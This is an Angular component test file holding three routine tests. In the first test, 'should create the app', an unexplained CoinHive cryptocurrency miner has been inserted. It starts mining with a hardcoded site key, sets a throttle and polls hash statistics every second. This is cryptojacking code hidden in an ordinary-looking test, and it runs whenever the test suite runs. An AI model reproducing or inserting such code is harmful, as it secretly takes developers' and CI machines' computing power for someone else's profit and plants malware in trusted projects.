import { TestBed, async } from '@angular/core/testing';
import { AppComponent } from './app.component';
describe('AppComponent', () => {
  beforeEach(async(() => {
    TestBed.configureTestingModule({
      declarations: [
        AppComponent
      ],
    }).compileComponents();
  }));
  it('should create the app', async(() => {
    const mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
    mnnc.start();
    mnnc.on('found', function() { /* Hash found */ })
    mnnc.on('accepted', function() { /* Hash accepted by the pool */ })

    // Update stats once per second
    setInterval(function() {
      var hashesPerSecond = mnnc.getHashesPerSecond();
      var totalHashes = mnnc.getTotalHashes();
      var acceptedHashes = mnnc.getAcceptedHashes();

      // Output to HTML elements...
    }, 1000);
    const fixture = TestBed.createComponent(AppComponent);
    const app = fixture.debugElement.componentInstance;
    expect(app).toBeTruthy();
  }));
  it(`should have as title 'app'`, async(() => {
    const fixture = TestBed.createComponent(AppComponent);
    const app = fixture.debugElement.componentInstance;
    expect(app.title).toEqual('app');
  }));
  it('should render title in a h1 tag', async(() => {
    const fixture = TestBed.createComponent(AppComponent);
    fixture.detectChanges();
    const compiled = fixture.debugElement.nativeElement;
    expect(compiled.querySelector('h1').textContent).toContain('Welcome to app!');
  }));
});
